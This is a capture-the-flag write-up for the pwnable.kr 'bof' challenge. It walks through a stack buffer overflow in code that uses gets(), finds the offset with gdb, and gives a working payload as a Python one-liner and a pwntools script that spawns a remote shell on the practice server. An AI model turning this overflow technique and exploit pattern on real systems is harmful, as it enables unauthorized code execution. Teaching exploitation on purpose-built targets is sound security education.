---
layout: post
title: pwnable.kr - bof
---

## Prompt
Nana told me that buffer overflow is one of the most common software vulnerability. 
Is that true?

Download : http://pwnable.kr/bin/bof
Download : http://pwnable.kr/bin/bof.c

Running at : nc pwnable.kr 9000

## Solution
Download `bof.c`: 
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
        char overflowme[32];
        printf("overflow me : ");
        gets(overflowme);       // smash me!
        if(key == 0xcafebabe){
                system("/bin/sh");
        }
        else{
                printf("Nah..\n");
        }
}
int main(int argc, char* argv[]){
        func(0xdeadbeef);
        return 0;
}
```

We have a input buffer of 32 bytes allocated for us, but we can supply as many characters as we want. From the logic, we should try to overwrite `0xdeadbeef` with `0xcafebabe` to get our shell.

```
$ nc pwnable.kr 9000
this_is_33_characters_long_______
*** stack smashing detected ***: /home/bof/bof terminated
overflow me :
Nah..
```

Let's run it through `gdb`, and put a breakpoint at the comparison. 

```
$ gdb bof
gdb-peda$ break main
Breakpoint 1 at 0x68d
gdb-peda$ r
...
gdb-peda$ disas func
...
0x56555654 <+40>:	cmp    DWORD PTR [ebp+0x8],0xcafebabe
...
gdb-peda$ break *0x56555654
Breakpoint 2 at 0x56555654
gdb-peda$ c 
Continuing.
overflow me :
AAAAAAAA
...
gdb-peda$ x/50wx $esp
0xffffd180:	0xffffd19c	0xffffd284	0xf7fad000	0xf7fab9e0
0xffffd190:	0x00000000	0xf7fad000	0xf7ffc800	0x41414141
0xffffd1a0:	0x41414141	0xf7fad000	0x00000001	0x5655549d
0xffffd1b0:	0xf7fad3fc	0x00040000	0x56556ff4	0xf9cac400
0xffffd1c0:	0x00800000	0x56556ff4	0xffffd1e8	0x5655569f
0xffffd1d0:	0xdeadbeef	0x00000000	0x565556b9	0x00000000
...
```
I supplied `AAAAAAAA` because its hex code would be easy to find: see the two groupings of `0x41414141`. There are 52 characters from the start of `0x41414141` to `0xdeadbeef`. To overflow, we need 52 of any character and then `0xcafebabe`.
```
0xcafebabe --> '\xbe\xba\xfe\xca'
```
Now, to make our payload. FYI, I find it easier to mess around with byte code in Python2 than in Python3.
```
python -c "print 'A' * 52 + '\xbe\xba\xfe\xca'" > overflow
```
We can pipe in our payload to bof: `cat overflow | ./bof`, but we won't be able to see any output. BUT, if we `cat` again we can redirect the shell to our stdin and stdout.

```
root@kali:~# (cat overflow; cat) | ./bof
overflow me :
whoami
root
```
Let's grab the flag.
```
root@kali:~# (cat overflow; cat) | nc pwnable.kr 9000
whoami
bof
cat flag
{flag censored}
```

Alternatively, we can use `pwntools` to get an interactive shell.

```python
#!/usr/bin/python
from pwn import *

URL = 'pwnable.kr'
PORT = 9000
PAYLOAD = 'A' * 52 + '\xbe\xba\xfe\xca'

shell = remote(URL,PORT)
shell.send(PAYLOAD)
shell.interactive()
```
Running, `solve.py`:
```
root@kali:~# python solve.py 
[+] Opening connection to pwnable.kr on port 9000: Done
[*] Switching to interactive mode
$ whoami
bof
$ cat flag
{flag censored}
```
